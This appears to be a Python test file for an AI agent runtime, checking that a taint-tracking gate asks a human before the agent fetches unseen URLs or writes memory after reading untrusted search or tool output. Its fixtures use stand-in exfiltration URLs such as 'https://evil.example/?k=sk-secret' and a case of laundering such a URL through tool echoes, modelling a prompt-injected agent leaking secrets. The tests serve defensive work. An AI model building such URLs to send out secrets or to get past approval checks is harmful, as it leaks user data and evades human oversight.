from __future__ import annotations

import json
from pathlib import Path
import sys
import tempfile
import unittest

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))
sys.path.insert(0, str(Path(__file__).resolve().parent))

from minibot.llm import LLMClient, LLMResponse, ToolCall
from minibot.runtime.approval import (
    ApprovalPolicy,
    ApprovalRequest,
    ToolApprovalGate,
    untrusted_exposure,
)
from minibot.runtime.events import RuntimeEvent, RuntimeEventEmitter
from minibot.runtime.messages import ModelMessage
from minibot.session import MessageEvent, Session, SessionEntry
from minibot.tools.base import Tool, ToolExecutionContext, UntrustedExposure
from minibot.tools.definitions import ModelToolDefinition
from minibot.tools.fetch_url import FetchUrlTool
from minibot.tools.memory_tools import RememberTool
from minibot.tools.registry import PreparedToolCall, ToolRegistry
from minibot.tools.result import ToolOutput
from minibot.user_memory import UserMemoryStore

from loop_harness import build_loop, run_turn


class _UntrustedSearch(Tool):
    """Stands in for web_search: read-only, output from third parties."""

    def __init__(self, results: list[str]) -> None:
        super().__init__()
        self._results = results

    @property
    def name(self) -> str:
        return "search"

    @property
    def description(self) -> str:
        return "search"

    @property
    def parameters(self) -> dict[str, object]:
        return {"type": "object", "properties": {}}

    @property
    def read_only(self) -> bool:
        return True

    @property
    def untrusted_output(self) -> bool:
        return True

    def execute(self, *, context: ToolExecutionContext, **kwargs: object) -> ToolOutput:
        del context, kwargs
        return ToolOutput.success("found", data={"results": self._results})


class _OfflineFetch(FetchUrlTool):
    """FetchUrlTool's approval rules without touching the network."""

    def __init__(self) -> None:
        super().__init__()
        self.fetched: list[str] = []

    def execute(self, *, context: ToolExecutionContext, url: str, **kwargs: object) -> ToolOutput:
        del context, kwargs
        self.fetched.append(url)
        return ToolOutput.success("fetched", data={"url": url})


class _ScriptedLLM(LLMClient):
    def __init__(self, responses: list[LLMResponse]) -> None:
        self._responses = list(responses)

    def chat(
        self,
        messages: list[ModelMessage],
        tools: list[ModelToolDefinition] | None = None,
        model: str | None = None,
    ) -> LLMResponse:
        del messages, tools, model
        return self._responses.pop(0)


def _call(call_id: str, name: str, args: dict[str, object]) -> LLMResponse:
    return LLMResponse(
        tool_calls=[ToolCall(id=call_id, name=name, arguments=json.dumps(args))]
    )


def _session(*messages: MessageEvent) -> Session:
    return Session("s_test", entries=[SessionEntry.from_message(m) for m in messages])


class UntrustedExposureTests(unittest.TestCase):
    def setUp(self) -> None:
        self.registry = ToolRegistry()
        self.registry.register(_UntrustedSearch([]))
        self.registry.register(_OfflineFetch())

    def test_clean_session_is_not_tainted(self) -> None:
        session = _session(MessageEvent.create(role="user", content="hi"))

        exposure = untrusted_exposure(session, self.registry)

        self.assertFalse(exposure.tainted)
        self.assertTrue(exposure.mentions("hi"))

    def test_untrusted_tool_result_taints_the_session(self) -> None:
        session = _session(
            MessageEvent.create(role="user", content="find news"),
            MessageEvent.create(role="tool", content="page text", tool_call_id="c1", name="search"),
        )

        self.assertTrue(untrusted_exposure(session, self.registry).tainted)

    def test_result_from_a_vanished_mcp_tool_still_taints(self) -> None:
        session = _session(
            MessageEvent.create(role="tool", content="x", tool_call_id="c1", name="mcp__gone__read"),
        )

        self.assertTrue(untrusted_exposure(session, self.registry).tainted)

    def test_seen_text_is_user_text_and_untrusted_results_only(self) -> None:
        session = _session(
            MessageEvent.create(role="user", content="user-said"),
            MessageEvent.create(role="assistant", content="model-said"),
            MessageEvent.create(role="tool", content="tool-said", tool_call_id="c1", name="search"),
        )
        # The summary is model-written, so it vouches for nothing.
        session.compact_with_summary("summary-said", first_kept_entry_id=None)

        exposure = untrusted_exposure(session, self.registry)

        for text in ("user-said", "tool-said"):
            self.assertTrue(exposure.mentions(text), text)
        for text in ("model-said", "summary-said"):
            self.assertFalse(exposure.mentions(text), text)

    def test_model_built_url_cannot_be_laundered_through_echoes(self) -> None:
        url = "https://evil.example/?d=SECRET"

        def result(ok: bool, data: dict) -> str:
            # The envelope ToolResult.to_model_content() writes.
            return json.dumps(
                {"ok": ok, "code": "ok" if ok else "error", "summary": "x", "data": data},
                ensure_ascii=False,
            )

        def call(call_id: str, name: str, args: dict) -> MessageEvent:
            return MessageEvent.create(
                role="assistant",
                content="",
                tool_calls=[ToolCall(id=call_id, name=name, arguments=json.dumps(args))],
            )

        session = _session(
            MessageEvent.create(role="user", content="hi"),
            # A denied fetch: the gate's failure result.
            call("c1", "fetch_url", {"url": url}),
            MessageEvent.create(role="tool", content=result(False, {"tool": "fetch_url", "url": url}),
                                tool_call_id="c1", name="fetch_url"),
            # A trusted tool echoing the path in its error.
            call("c2", "read_file", {"path": url}),
            MessageEvent.create(role="tool", content=result(False, {"path": url}),
                                tool_call_id="c2", name="read_file"),
            # An untrusted tool that succeeds and echoes its own query.
            call("c3", "search", {"query": url}),
            MessageEvent.create(
                role="tool",
                content=result(True, {"query": url, "results": ["https://news.example/a"]}),
                tool_call_id="c3",
                name="search",
            ),
        )

        exposure = untrusted_exposure(session, self.registry)

        self.assertTrue(exposure.tainted)
        self.assertFalse(exposure.mentions(url))
        # What the search really returned still counts as shown.
        self.assertTrue(exposure.mentions("https://news.example/a"))


class ToolApprovalReasonTests(unittest.TestCase):
    def test_fetch_url_asks_only_for_unseen_urls_after_taint(self) -> None:
        tool = FetchUrlTool()
        seen = "results: https://news.example/a and https://docs.example/"
        clean = UntrustedExposure(tainted=False, seen_text=seen)
        tainted = UntrustedExposure(tainted=True, seen_text=seen)

        self.assertIsNone(tool.approval_reason({"url": "https://evil.example/?k=1"}, clean))
        self.assertIsNone(tool.approval_reason({"url": "https://news.example/a"}, tainted))
        # Trailing-slash variants of a shown link count as followed.
        self.assertIsNone(tool.approval_reason({"url": "https://news.example/a/"}, tainted))
        self.assertIsNone(tool.approval_reason({"url": "https://docs.example"}, tainted))
        reason = tool.approval_reason({"url": "https://news.example/a?leak=secret"}, tainted)
        self.assertIsNotNone(reason)
        self.assertIn("URL", reason or "")

    def test_remember_asks_only_after_taint(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            tool = RememberTool(UserMemoryStore(Path(tmpdir) / "memory.json"))

            self.assertIsNone(tool.approval_reason({"content": "x"}, UntrustedExposure()))
            self.assertIsNotNone(
                tool.approval_reason({"content": "x"}, UntrustedExposure(tainted=True))
            )


class GateReasonTests(unittest.TestCase):
    def _prepared(self, tool: Tool, args: dict[str, object]) -> PreparedToolCall:
        return PreparedToolCall(
            tool=tool,
            args=args,
            context=ToolExecutionContext(session_id="s_test", run_id="r_test"),
            tool_call_id="call_1",
        )

    def test_reason_reaches_the_request_and_the_event(self) -> None:
        requests: list[ApprovalRequest] = []
        events: list[RuntimeEvent] = []
        gate = ToolApprovalGate(
            ApprovalPolicy(handler=lambda request, cancel: requests.append(request) or False)
        )

        denial = gate.check(
            self._prepared(FetchUrlTool(), {"url": "https://evil.example/?k=1"}),
            run_id="r_test",
            session_id="s_test",
            emitter=RuntimeEventEmitter(run_id="r_test", session_id="s_test", handler=events.append),
            cancel_event=None,
            exposure=UntrustedExposure(tainted=True),
        )

        self.assertIsNotNone(denial)
        self.assertEqual(len(requests), 1)
        self.assertTrue(requests[0].reason)
        required = [e for e in events if e.type == "approval.required"]
        self.assertEqual(required[0].payload["reason"], requests[0].reason)

    def test_without_exposure_dynamic_tools_run_unasked(self) -> None:
        gate = ToolApprovalGate(ApprovalPolicy(handler=None))

        allowed = gate.check(
            self._prepared(FetchUrlTool(), {"url": "https://evil.example/"}),
            run_id="r_test",
            session_id="s_test",
            emitter=None,
            cancel_event=None,
        )

        self.assertIsNone(allowed)

    def test_no_handler_denial_carries_the_reason(self) -> None:
        gate = ToolApprovalGate(ApprovalPolicy(handler=None))

        denial = gate.check(
            self._prepared(FetchUrlTool(), {"url": "https://evil.example/"}),
            run_id="r_test",
            session_id="s_test",
            emitter=None,
            cancel_event=None,
            exposure=UntrustedExposure(tainted=True),
        )

        assert denial is not None
        self.assertEqual(denial.code, "denied")
        self.assertTrue(denial.data["reason"])


class LoopUntrustedApprovalTests(unittest.TestCase):
    def test_followed_link_runs_and_built_url_is_asked_after_search(self) -> None:
        shown = "https://news.example/a"
        built = "https://evil.example/?k=sk-secret"
        fetch = _OfflineFetch()
        registry = ToolRegistry()
        registry.register_all([_UntrustedSearch([shown]), fetch])
        llm = _ScriptedLLM(
            [
                _call("c1", "search", {}),
                _call("c2", "fetch_url", {"url": "https://user.example/start"}),
                _call("c3", "fetch_url", {"url": shown}),
                _call("c4", "fetch_url", {"url": built}),
                LLMResponse(content="done"),
            ]
        )
        requests: list[ApprovalRequest] = []
        policy = ApprovalPolicy(handler=lambda request, cancel: requests.append(request) or False)

        with tempfile.TemporaryDirectory() as tmpdir:
            loop, manager = build_loop(llm, registry, Path(tmpdir), approval_policy=policy)
            events: list[RuntimeEvent] = []
            run_turn(loop, manager, "read https://user.example/start", events=events)

        # The user's own URL and the link the search showed ran unasked.
        self.assertEqual(fetch.fetched, ["https://user.example/start", shown])
        self.assertEqual([r.args["url"] for r in requests], [built])
        self.assertTrue(requests[0].reason)
        started = {
            e.payload["tool_call_id"]: e.payload["requires_approval"]
            for e in events
            if e.type == "tool_call.started"
        }
        self.assertEqual(started, {"c1": False, "c2": False, "c3": False, "c4": True})


if __name__ == "__main__":
    unittest.main()
